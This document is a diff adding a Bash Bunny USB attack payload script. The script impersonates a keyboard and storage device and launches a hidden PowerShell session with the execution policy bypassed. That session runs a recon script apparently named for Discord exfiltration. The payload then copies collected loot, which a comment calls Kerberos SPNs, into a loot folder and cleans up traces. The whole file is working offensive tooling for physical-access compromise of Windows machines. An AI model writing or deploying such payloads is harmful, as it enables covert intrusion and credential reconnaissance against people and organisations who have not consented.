@@ -1,0 +1,38 @@
+# System default payload
+LED SETUP
+GET SWITCH_POSITION
+SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
+mkdir -p /root/udisk/loot/Recon
+rm /root/udisk/DONE
+
+
+
+ATTACKMODE HID STORAGE
+
+LED ATTACK
+RUN WIN powershell -w h -NoP -NonI -ep Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\bbnrecon_discord.ps1')"
+Q DELAY 1000
+Q ENTER	
+# Wait until files are done copying.
+
+LED STAGE2 #Flashing Orange
+WAITEJECT
+
+# Start Cleanup 
+LED CLEANUP
+
+# Delete Exfil file
+rm /root/udisk/DONE
+
+# Move Kerberos SPNS to permanent loot directory
+cp /root/loot/Recon/* /root/udisk/loot/Recon/
+#
+sync
+# Clean up temporary loot directory
+#rm -rf /loot/Recon/*
+
+# Sync file system
+sync
+
+# Complete
+LED FINISH
